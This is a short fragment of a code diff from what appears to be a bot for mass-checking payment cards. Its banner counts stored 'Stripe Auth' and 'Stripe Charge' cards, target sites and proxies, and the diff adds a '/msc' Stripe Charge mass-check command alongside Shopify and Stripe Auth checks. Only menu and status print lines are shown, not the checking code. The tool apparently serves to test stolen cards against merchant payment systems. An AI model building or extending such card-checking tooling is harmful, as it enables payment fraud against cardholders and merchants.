     print(f"  🔓 Stripe Auth cards: {len(get_all_stripe_cards())}")
+    print(f"  💳 Stripe Charge cards: {len(get_all_sc_cards())}")
     print(f"  🌐 Sites: {len(load_sites())}")
     print(f"  📡 Proxies: {len(load_proxies())}")
     print(f"  🎮 Mode: {current_mode} ({PARALLEL_WORKERS}x)")
@@ -3155,6 +3771,7 @@ if __name__ == "__main__":
     print("  COMMANDS:")
     print("    /mass  ─ Shopify mass check")
     print("    /mau   ─ Stripe Auth mass check (FREE)")
+    print("    /msc   ─ Stripe Charge mass check")
     print("    /px    ─ Check proxies")
     print("    /stats ─ Statistics")
     print("─" * 60)
